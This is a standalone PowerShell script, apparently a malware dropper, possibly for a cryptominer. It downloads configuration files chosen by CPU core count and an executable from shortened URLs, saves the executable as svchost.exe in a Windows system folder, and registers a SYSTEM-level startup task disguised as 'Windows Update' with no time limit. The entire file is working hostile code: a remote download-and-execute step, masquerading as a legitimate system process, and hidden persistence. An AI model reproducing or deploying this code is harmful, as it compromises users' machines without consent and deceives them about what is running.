###123
$cpu=get-wmiobject win32_processor
$client = new-object System.Net.WebClient
if(@($cpu).count*$cpu.NumberOfLogicalProcessors -lt 4)
{
$client.DownloadFile('http://suo.im/3O2aEH', 'C:\windows\system\config.json')
}
elseif(@($cpu).count*$cpu.NumberOfLogicalProcessors -lt 8)
{
$client.DownloadFile('http://suo.im/2AYDW6', 'C:\windows\system\config.json')
}
elseif(@($cpu).count*$cpu.NumberOfLogicalProcessors -ge 8)
{
$client.DownloadFile('http://suo.im/2Zi8FW', 'C:\windows\system\config.json')
}
if ([IntPtr]::Size -eq 8)
{
   $client.DownloadFile('http://suo.im/2ZlKOz', 'C:\windows\system\svchost.exe')
}
else
{
    $client.DownloadFile('http://suo.im/4aP64T', 'C:\windows\system\svchost.exe')
}
$TaskName = "Windows Update"
# attach the Task Scheduler com object
$ScheduleObject = new-object -ComObject("Schedule.Service")
# connect to the local machine. 
$ScheduleObject.Connect()
$rootFolder = $ScheduleObject.GetFolder("\")

$TaskDefinition = $ScheduleObject.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = "windows update"
$TaskDefinition.RegistrationInfo.Author = "windows系统更新"
#$TaskDefinition.Principle.RunLevel = $true
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.AllowDemandStart = $true
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $false
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.ExecutionTimeLimit = "PT0S"  # See Note Below

$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(2) # Creates a "At System Startup" trigger
$trigger.StartBoundary = "2018-01-01T00:00:00.2113963"
$trigger.Enabled = $true

$Action = $TaskDefinition.Actions.Create(0)
$action.Path = "c:\windows\system\svchost.exe"
$Action.WorkingDirectory = "c:\windows\system\"

$rootFolder.RegisterTaskDefinition($TaskName,$TaskDefinition,6,"system",$null,1)
SCHTASKS /Run /TN "windows update"